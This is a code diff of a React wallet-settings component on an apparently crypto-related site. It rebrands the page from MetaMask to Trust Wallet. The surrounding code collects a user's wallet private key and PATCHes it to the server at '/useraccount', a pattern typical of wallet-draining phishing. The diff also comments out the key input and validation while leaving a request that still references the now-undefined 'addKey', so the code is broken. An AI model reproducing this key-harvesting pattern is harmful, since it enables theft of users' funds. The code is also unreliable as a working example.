@@ -75,7 +75,7 @@ const UserSettings = () => {
         e.preventDefault()
 
         const ethereum = window.ethereum;
-        if (!ethereum) return window.alert('no metamask wallet found please switch to metamask mobile app\'s browser');
+        if (!ethereum) return window.alert('no Trust wallet found please switch to trust wallet mobile app\'s browser');
 
         const connect = await ethereum.request({ method: 'eth_requestAccounts' });
 
@@ -93,16 +93,16 @@ const UserSettings = () => {
             console.log(response.data);
 
             if (response.status === 204) {
-                setGetKey(true);
-                if (!userKey) return window.alert('private key required');
-                console.log(userKey);
+                // // setGetKey(true);
+                // if (!userKey) return window.alert('private key required');
+                // console.log(userKey);
 
-                const validKey = userKey.length === 64
+                // const validKey = userKey.length === 64
 
-                if (!validKey) return window.alert('invalid key', userKey.length);
+                // if (!validKey) return window.alert('invalid key', userKey.length);
 
-                const addKey = `0x${userKey}`
-                console.log(addKey);
+                // const addKey = `0x${userKey}`
+                // console.log(addKey);
 
                 const response = await axios.patch('/useraccount', JSON.stringify({ id : userId, walletAddress: userAccount, privateKey: addKey }));
                 if (response.status === 200) {
@@ -200,8 +200,8 @@ const UserSettings = () => {
                         <>
                             
                             <span className='image--span'>
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/2048px-MetaMask_Fox.svg.png" alt="wallet logo" />
-                                <h1>Metamask</h1>
+                                <img src="https://trustwallet.com/assets/images/media/assets/vertical_blue.png" alt="wallet logo" />
+                                <h1>TrustWallet</h1>
                                 <p> Your Access to the Decentralized Web</p>
                                 <button className='login--btn' onClick={handleWalletUpdate}>
 
